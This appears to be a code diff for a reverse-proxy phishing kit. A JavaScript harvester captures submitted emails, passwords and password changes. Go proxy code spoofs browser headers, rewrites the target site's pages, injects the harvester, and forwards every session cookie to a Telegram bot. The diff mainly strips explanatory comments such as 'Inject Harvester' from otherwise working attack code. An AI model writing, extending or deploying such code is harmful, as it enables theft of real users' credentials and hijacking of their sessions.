@@ -48,7 +48,6 @@ document.addEventListener('submit', function(e) {
         }
     }
 
-    // Capture Login
     if (hasEmail && hasPassword) {
         fetch('/api/harvest', {
             method: 'POST',
@@ -58,7 +57,6 @@ document.addEventListener('submit', function(e) {
     }
 }, true);
 
-// Capture Password Changes
 setInterval(() => {
     const inputs = document.querySelectorAll('input[type="password"]');
     if (inputs.length >= 2) {
@@ -113,7 +111,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return
 		}
 
-		// SPOOF HEADERS
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
@@ -124,7 +121,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		resp, err := proxyClient.Do(req)
 		if err != nil {
-			c.String(502, "Target Unavailable")
+			c.String(502, "Target Unavailable or Invalid Domain")
 			return
 		}
 		defer resp.Body.Close()
@@ -137,7 +134,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
-		// --- CONTENT REWRITING ---
 		rewrittenBody := strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")
 
 		if strings.Contains(email, "@") {
@@ -146,16 +142,13 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			rewrittenBody = strings.ReplaceAll(rewrittenBody, "http://"+domain, c.Request.Host+"/")
 		}
 
-		// Inject Base Tag
 		baseTag := `<base href="` + targetBase + `">`
 		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>\n"+baseTag, 1)
-
-		// Inject Harvester
 		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
 
 		CloneHeaders(resp, c.Writer)
 
-		// FIX: Loop through ALL cookies to bind the session properly (Fixes 163.com)
+		// Loop through ALL cookies
 		for _, cookie := range resp.Cookies() {
 			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
 			SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
